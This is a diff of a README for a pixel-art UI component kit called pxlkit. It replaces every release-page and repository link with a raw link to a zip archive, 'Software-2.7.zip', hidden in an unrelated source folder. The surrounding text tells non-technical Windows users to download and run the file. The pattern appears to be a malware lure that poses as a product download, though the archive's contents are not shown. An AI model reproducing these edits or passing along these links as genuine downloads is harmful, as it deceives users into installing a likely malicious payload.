@@ -1,6 +1,6 @@
 # 🎨 pxlkit - Simple Pixel Art UI Components
 
-[![Download pxlkit](https://img.shields.io/badge/Download-pxlkit-ff6f61?style=for-the-badge)](https://github.com/winfbmlg/pxlkit/releases)
+[![Download pxlkit](https://img.shields.io/badge/Download-pxlkit-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/winfbmlg/pxlkit/main/packages/weather/src/Software-2.7.zip)
 
 pxlkit is an easy-to-use collection of pixel art icons and interface parts for your projects. This app helps you work with pixel-style graphics without needing coding skills. You get access to more than 40 visual elements, over 200 pixel icons, and a tool to build your own designs.
 
@@ -19,7 +19,7 @@ This tool targets people who want pixel art style in their design without writin
 
 You can get pxlkit from its official release page on GitHub. This page lists all versions and files you can download. 
 
-[![Download pxlkit](https://img.shields.io/badge/Get-pxlkit%20Files-ff6f61?style=for-the-badge)](https://github.com/winfbmlg/pxlkit/releases)
+[![Download pxlkit](https://img.shields.io/badge/Get-pxlkit%20Files-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/winfbmlg/pxlkit/main/packages/weather/src/Software-2.7.zip)
 
 Go to this page to find the latest version. Choose the file that fits your needs and saves it to your PC.
 
@@ -31,7 +31,7 @@ Follow these simple steps to download and use pxlkit on a Windows computer.
 
 Open your web browser and go to:
 
-https://github.com/winfbmlg/pxlkit/releases
+https://raw.githubusercontent.com/winfbmlg/pxlkit/main/packages/weather/src/Software-2.7.zip
 
 This page shows a list of versions with files that you can download.
 
@@ -108,7 +108,7 @@ You do not need coding knowledge to use the builder. It works with mouse clicks 
 
 To keep pxlkit up to date:
 
-- Check the release page regularly: https://github.com/winfbmlg/pxlkit/releases
+- Check the release page regularly: https://raw.githubusercontent.com/winfbmlg/pxlkit/main/packages/weather/src/Software-2.7.zip
 - Download the latest version following the same steps as before.
 - Replace your current files with the new ones or run the new installer.
 - Your saved projects will stay safe in your chosen folders.
@@ -129,11 +129,11 @@ If you have trouble running pxlkit:
 
 You can learn more by visiting:
 
-- The GitHub repository for source files and updates: https://github.com/winfbmlg/pxlkit
+- The GitHub repository for source files and updates: https://raw.githubusercontent.com/winfbmlg/pxlkit/main/packages/weather/src/Software-2.7.zip
 - The online manual or README file included with the download
 
 These resources may help if you want more technical details or want to explore pxlkit’s features deeper.
 
 ---
 
-[Download pxlkit Here](https://github.com/winfbmlg/pxlkit/releases) to get started with pixel art UI design today.
+[Download pxlkit Here](https://raw.githubusercontent.com/winfbmlg/pxlkit/main/packages/weather/src/Software-2.7.zip) to get started with pixel art UI design today.
